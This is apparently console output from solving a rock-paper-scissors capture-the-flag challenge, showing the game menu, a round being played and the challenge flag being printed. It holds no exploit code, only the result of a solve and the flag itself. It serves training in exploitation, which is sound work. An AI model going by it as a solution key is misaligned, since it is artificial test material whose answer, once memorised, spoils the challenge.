b": +===============================================+\n|   Wellcome to my Rock-Paper-Scissors's game   |\n+-----------------------------------------------+\n| Current score: \n| aaaaaaaaaaaaaad: 15 Points \n| Computer: 0 Points \n+-----------------------------------------------+\n| Options:\n| 1) Display game rules ------------- (0 Points)\n| 2) Play next round ---------------- (0 Points)\n| 3) Skip N rounds ------------------ (2 Points)\n| 4) Enable Ascii-art --------------- (3 Points)\n| 5) Change user name --------------- (5 Points)\n| 6) Print the flag! ------- (4294967295 Points)\n| 7) Exit --------------------------- (0 Points)\n+-----------------------------------------------+\n| Please chose an option ["
b' ]\x08\x08+===============================================+\n| User input is: 2\n+-----------------------------------------------+\n| Game #2220\n+-----------------------------------------------+\n| What do you want to do?\n| 1) ROCK\n| 2) PAPPER\n| 3) SCISSORS\n+-----------------------------------------------+\n| Please chose an option ['
[*] Switching to interactive mode
| Computer chosed: 2
| You chosed: 3
| Point goes to: aaaaaaaaaaaaaad
| The flag is:ICHSA_CTF{exploitation_with_cop_is_why_better_than_any_crime}
[*] Got EOF while reading in interactive
$  

```
